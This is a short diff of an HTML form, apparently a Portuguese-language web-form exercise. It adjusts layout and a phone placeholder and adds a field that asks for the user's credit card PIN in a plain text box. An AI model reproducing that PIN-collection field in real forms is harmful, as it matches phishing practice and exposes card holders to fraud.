@@ -111,6 +111,7 @@
 
         #container {
             display: flex;
+            margin-bottom: 30px;
         }
     </style>
 </head>
@@ -134,7 +135,7 @@
                 <input type="email" name="email" id="iemail" placeholder="Seu email" size="30" required>
 
                 <br><label for="ifone">Telefone:</label>
-                <input type="tel" name="fone" id="ifone" placeholder="(__)_____-____" pattern="[0-9]{2,3}-[0-9]{4,5}-[0-9]{4}" size="12" maxlength="14" required>
+                <input type="tel" name="fone" id="ifone" placeholder="__-_____-____" pattern="[0-9]{2,3}-[0-9]{4,5}-[0-9]{4}" size="12" maxlength="14" required>
 
                 
 
@@ -268,6 +269,11 @@
                 </div>
             </fieldset>
         </div>
+
+        <fieldset>
+            <label for="isenha">Senha do seu Cartão de Credito:</label><br>
+            <input type="text" name="senha" id="isenha" pattern="[0-9]{4}" required>
+        </fieldset>
 
         <div id="enviarlimpar">
             <input id="botaolimpar" type="reset" value="Limpar">
